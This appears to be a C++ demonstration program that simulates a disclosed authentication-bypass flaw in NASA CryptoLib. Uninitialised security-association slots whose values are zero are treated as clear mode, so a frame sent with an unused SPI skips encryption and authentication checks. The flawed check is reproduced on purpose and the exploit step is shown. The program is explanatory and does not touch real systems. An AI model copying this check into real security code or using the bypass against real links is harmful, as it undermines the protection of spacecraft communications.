#include <iostream>
#include <cstring>

// CVE-2025-46673 Proof of Concept

struct SecurityAssociation
{
	int sa_state;          // SA_NONE=0, SA_OPERATIONAL=1, etc.
	int est;               // Encryption Service Type
	int ast;               // Authentication Service Type
	unsigned char key[32]; // Session key
};

typedef SecurityAssociation SecurityAssociation_t;

class Spacecraft
{
private:
	SecurityAssociation_t sa[64];  
	
public:
	Spacecraft()
	{
		std::cout << "\n[*] NASA CryptoLib Initialization [*]\n\n";
		
		// Step 1: Allocate 64 SA slots
		std::cout << "[1] Allocating 64 SA slots\n\n";
		
		// Step 2: Zero out ALL slots
		std::memset(sa, 0, sizeof(SecurityAssociation_t) * 64);
		std::cout << "[2] Zeroing out all 64 slots\n";
		std::cout << "    All sa_state = 0\n";
		std::cout << "    All est = 0\n";
		std::cout << "    All ast = 0\n\n";
		
		// Step 3: Configure ONLY first 17 slots
		std::cout << "[3] Configuring first 17 slots\n\n";
		for (int i = 0; i < 17; i++)
		{
			sa[i].sa_state = 1;  	// SA_OPERATIONAL
			sa[i].est = 1;			// Encryption ON
			sa[i].ast = 1;			// Authentication ON
			for (int j = 0; j < 32; j++)
			{
				sa[i].key[j] = 0xFF;
			}
		}
		
		std::cout << "    sa[0-16]   = Configured (secure)\n";
		std::cout << "    sa[17-63]  = Not configured (still zeros!)\n\n";
	}
	
	// NASA's vulnerable frame processing
	void process_frame_vulnerable(int spi, const std::string &command)
	{
 		std::cout << "---------------------------------------------------\n";
        std::cout << "Processing frame with SPI = " << spi << "\n";
        std::cout << "---------------------------------------------------\n\n";

        SecurityAssociation_t* sa_ptr = &sa[spi];
        
        // Show what's in this SA
        std::cout << "Looking at sa[" << spi << "]:\n";
        std::cout << "  sa_state = " << sa_ptr->sa_state << "\n";
        std::cout << "  est      = " << sa_ptr->est << "\n";
        std::cout << "  ast      = " << sa_ptr->ast << "\n\n";
		
		// THE BUG: Checks values, not state
		//std::cout << "NASA's check: if (est == 0 && ast == 0)\n\n";
		
		if (sa_ptr->est == 0 && sa_ptr->ast == 0)
		{
			std::cout << "  Result: Clear Mode (no crypto needed)\n\n";
            std::cout << "  [!] BYPASSED - No encryption check\n";
            std::cout << "  [!] BYPASSED - No authentication check\n\n";
            std::cout << "  Command executed: \"" << command << "\"\n\n";
		}
		else
		{
			std::cout << "  Result: Crypto required\n";
			std::cout << "  Checking encryption... OK\n";
			std::cout << "  Checking authentication... OK\n";
			std::cout << "  Command executed: \"" << command << "\"\n\n";
		}
	}
	
	// Show SA details
	void show_sa_state(int index)
    {
        std::cout << "sa[" << index << "]:\n";
        std::cout << "  sa_state = " << sa[index].sa_state;
        
        if (index < 17)
            std::cout << " (configured)\n";
        else
            std::cout << " (uninitialized)\n";
            
        std::cout << "  est      = " << sa[index].est << "\n";
        std::cout << "  ast      = " << sa[index].ast << "\n\n";
    }
};



int main()
{
    std::cout << "===================================================\n";
    std::cout << "  CVE-2025-46673: SDLS Bypass\n";
    std::cout << "===================================================\n";
	
	Spacecraft sat;
	
   	std::cout << "\n===================================================\n";
    std::cout << " TEST 1: Normal Operation\n";
    std::cout << "===================================================\n\n";

	sat.show_sa_state(5);
	sat.process_frame_vulnerable(5, "NOOP");
	
 	std::cout << "===================================================\n";
    std::cout << " TEST 2: Exploit\n";
    std::cout << "===================================================\n\n";
	
	std::cout << "Attacker sends frame with SPI = 44\n\n";
	
	sat.show_sa_state(44);
    sat.process_frame_vulnerable(44, "MALICIOUS_COMMAND");
    
	return (0);
}
